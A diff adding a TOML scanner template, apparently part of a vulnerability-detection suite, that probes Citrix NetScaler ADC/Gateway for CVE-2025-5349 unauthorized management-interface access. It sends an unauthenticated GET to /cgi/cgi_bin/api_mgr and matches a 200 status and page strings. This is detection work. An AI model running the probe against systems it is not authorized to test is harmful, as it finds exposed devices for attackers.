@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "检测 Citrix NetScaler ADC 和 NetScaler Gateway 管理接口的 CVE-2025-5349 未授权访问漏洞，通过向 /cgi/cgi_bin/api_mgr 发送 GET 请求，若返回 200 状态码且响应包含管理面板特征字符串，则判定目标存在漏洞"
+id = "POC-AVE-2025-0037"
+name = "CVE-2025-5349 NetScaler ADC/Gateway 管理接口未授权访问 PoC"
+severity = "high"
+tags = [
+    "cve-2025-5349",
+    "netscaler",
+    "citrix",
+    "improper-access-control",
+]
+vuln_id = [
+    "CVE-2025-5349",
+    "AVE-2025-0037",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi/cgi_bin/api_mgr"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<title>NetScaler",
+    "practice",
+]
